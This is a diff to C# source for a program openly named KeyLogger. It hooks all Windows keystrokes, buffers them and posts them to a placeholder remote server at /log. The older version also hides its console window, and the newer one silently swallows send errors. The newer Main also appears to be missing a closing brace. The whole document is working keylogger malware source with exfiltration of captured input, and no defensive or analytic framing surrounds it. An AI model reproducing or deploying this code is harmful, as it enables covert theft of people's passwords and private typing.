@@ -1,18 +1,17 @@
 using System;
 using System.Diagnostics;
-using System.Net;
+using System.Net.Http;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
-using System.Windows.Forms;
 
 class KeyLogger
 {
-    private static string URL = GetServerUrl();  // Dynamically updated server URL
+    private static string URL = "URL_PLACEHOLDER/log";
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
     private static StringBuilder buffer = new StringBuilder();
-    private static bool capsLockOn = Control.IsKeyLocked(Keys.CapsLock);
+    private static bool capsLockOn = false;
     private static IntPtr hookId = IntPtr.Zero;
 
     private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
@@ -20,12 +19,27 @@ class KeyLogger
 
     static void Main()
     {
-        var handle = GetConsoleWindow();
-        ShowWindow(handle, 0); // Hide console window
+        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+        {
+            Console.WriteLine("This keylogger only runs on Windows.");
+            return;
 
-        hookId = SetHook(proc);
-        Application.Run();
-        UnhookWindowsHookEx(hookId);
+        try
+        {
+            capsLockOn = GetCapsLockState();
+
+            hookId = SetHook(proc);
+            AppDomain.CurrentDomain.ProcessExit += (s, e) => UnhookWindowsHookEx(hookId);
+
+            while (true)
+            {
+                Thread.Sleep(100);
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("Keylogger error: " + ex.Message);
+        }
     }
 
     private static IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -33,8 +47,7 @@ class KeyLogger
         using (Process curProcess = Process.GetCurrentProcess())
         using (ProcessModule curModule = curProcess.MainModule)
         {
-            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
-                GetModuleHandle(curModule.ModuleName), 0);
+            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
         }
     }
 
@@ -43,34 +56,24 @@ class KeyLogger
         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
         {
             int vkCode = Marshal.ReadInt32(lParam);
-            Keys key = (Keys)vkCode;
+            char keyChar = (char)vkCode;
 
-            if (key == Keys.CapsLock)
+            if (keyChar == 0x14) // Caps Lock
             {
                 capsLockOn = !capsLockOn;
-                return (IntPtr)1; // Skip default processing
-            }
-
-            if (key == Keys.Back && buffer.Length > 0)
-            {
-                buffer.Length--; // Remove last char
                 return (IntPtr)1;
             }
 
-            string keyStr = key.ToString();
-            if (keyStr.Length == 1)
+            if (keyChar == '\b' && buffer.Length > 0)
             {
-                char ch = keyStr[0];
-                if (capsLockOn ^ Control.ModifierKeys.HasFlag(Keys.Shift))
-                {
-                    ch = char.ToUpper(ch);
-                }
-                else
-                {
-                    ch = char.ToLower(ch);
-                }
+                buffer.Length--;
+                return (IntPtr)1;
+            }
 
-                buffer.Append(ch);
+            if (char.IsLetterOrDigit(keyChar))
+            {
+                keyChar = capsLockOn ? char.ToUpper(keyChar) : char.ToLower(keyChar);
+                buffer.Append(keyChar);
             }
 
             if (buffer.Length >= 3)
@@ -78,7 +81,7 @@ class KeyLogger
                 string data = buffer.ToString();
                 buffer.Clear();
                 new Thread(() => SendToServer(data)).Start();
-                Thread.Sleep(300); // Prevent request spamming
+                Thread.Sleep(300);
             }
         }
 
@@ -89,62 +92,33 @@ class KeyLogger
     {
         try
         {
-            using (WebClient client = new WebClient())
+            using (HttpClient client = new HttpClient())
             {
-                var postData = $"data={Uri.EscapeDataString(data)}";
-                client.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
-                client.UploadString(URL, "POST", postData);  // Send the keystroke data to the server
+                var postData = new StringContent($"data={Uri.EscapeDataString(data)}", Encoding.UTF8, "application/x-www-form-urlencoded");
+                client.PostAsync(URL, postData).Wait();
             }
         }
-        catch (Exception ex)
-        {
-            // Optionally log the error
-        }
+        catch { /* Silently fail */ }
     }
 
     // Windows API Imports
     [DllImport("user32.dll")]
-    private static extern IntPtr SetWindowsHookEx(int idHook,
-        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
     [DllImport("user32.dll")]
-    [return: MarshalAs(UnmanagedType.Bool)]
     private static extern bool UnhookWindowsHookEx(IntPtr hhk);
 
     [DllImport("user32.dll")]
-    private static extern IntPtr CallNextHookEx(IntPtr hhk,
-        int nCode, IntPtr wParam, IntPtr lParam);
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
 
     [DllImport("kernel32.dll")]
     private static extern IntPtr GetModuleHandle(string lpModuleName);
 
-    [DllImport("kernel32.dll")]
-    private static extern IntPtr GetConsoleWindow();
-
     [DllImport("user32.dll")]
-    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    public static extern short GetKeyState(int keyCode);
 
-    private static string GetServerUrl()
+    private static bool GetCapsLockState()
     {
-        string ipAddress = "URL_PLACEHOLDER";  // Default to local IP
-        bool forwarded = false;  // Set this flag to true if you want to use the forwarded IP
-        if (forwarded)
-        {
-            ipAddress = GetLocalIPAddress();  // Dynamically get the local machine IP
-        }
-        return $"http://{ipAddress}/log";  // Construct URL dynamically
-    }
-
-    private static string GetLocalIPAddress()
-    {
-        var host = Dns.GetHostEntry(Dns.GetHostName());
-        foreach (var ip in host.AddressList)
-        {
-            if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
-            {
-                return ip.ToString();
-            }
-        }
-        return "localhost";  // Return localhost if no IP is found
+        return (GetKeyState(0x14) & 0x0001) != 0;
     }
 }
